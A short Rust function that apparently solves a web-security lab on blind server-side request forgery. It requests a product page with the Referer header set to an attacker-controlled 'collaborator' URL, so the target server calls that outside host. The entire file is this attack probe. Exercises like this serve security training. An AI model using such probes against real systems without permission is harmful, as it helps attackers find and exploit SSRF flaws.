use reqwest::header::{HeaderMap, HeaderValue};

pub async fn lookup(url: &str, collaborator: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();

    let mut headers = HeaderMap::new();
    headers.insert("Content-Type", HeaderValue::from_static("application/x-www-form-urlencoded"));
    headers.insert("Referer", HeaderValue::from_str(collaborator)?);
    let request = client.get(format!("{}/product?productId=1",url))
        .headers(headers)
        .build()?;

    let _ = client.execute(request).await?;
    Ok(())
}

